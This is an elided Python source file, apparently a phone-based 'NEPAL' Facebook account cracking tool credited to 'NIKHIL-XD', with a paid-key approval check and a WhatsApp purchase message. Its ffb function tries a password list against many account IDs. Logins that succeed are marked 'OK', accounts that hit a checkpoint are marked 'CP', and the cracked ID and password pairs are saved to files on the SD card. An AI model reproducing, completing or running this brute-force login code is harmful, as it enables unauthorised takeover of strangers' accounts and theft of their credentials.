...
logo=("""\033[1;37m
 ...
 | \| |_ _| |/ / || |_ _| |    |   \| | | | \| |
 | .` || || ' <| __ || || |__  | |) | |_| | .` |
 |_|\_|___|_|\_\_||_|___|____| |___/ \___/|_|\_|  
...
def approval():
  ...
  os.system('clear')
  print(logo)
  animation("\033[1;37m YOU NEED APPROVED TO USE THIS TOOL   \033[1;37m")
  animation("\033[1;37m [•] Your Key :\x1b[1;92m "+id);time.sleep(0.1)
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/NIKHILyy-XD/approval/blob/main/approval.txt").text
    if id in httpCaht:
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                               ...
                               public()                      
                                ...
                                if cpok in ['1','01']:
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/NEPAL-OK.txt', 'a')
                                    animation(' >> Opening NEPAL-OK.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/NEPAL-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/NEPAL-CP.txt', 'a')
                                    animation(' >> Opening NEPAL-CP.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/NEPAL-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
                                        animation('\x1b[38;5;208m'+cpid);
                                        cpids.close()
                                    print('\033[1;37m----------------------------------------------')
                                    input(' >> Press Enter to return ')
                                    menu()
                                    ...
                                    print('\033[1;37m----------------------------------------------')
                                    animation(' >> Opening Menu')
                                    time.sleep(2)
                                    menu()
                        elif xd in ['0','00']:

                                clear()
                                animation(' \x1b[1;92m>> Thanks for Using This Tool ')
                                time.sleep(2)
                                exit()
                        ...
                        tks = ("Hi NIKHIL Sir, I Need To Buy Your Paid NEPAL PRO Tools Version 2.0.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python nepal.py')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [NIKHIL-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in NIKHIL:
                                ...
                                print('\r\r\033[1;32m [NIKHIL-OK] %s | %s'%(ids,pas))
                        ...
                        elif 'checkpoint' in NIKHIL:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [NIKHIL-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [NIKHIL-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/NIKHIL-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [NIKHIL-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/NIKHIL-OK.txt','a').write(uid+'|'+pas+'\n')
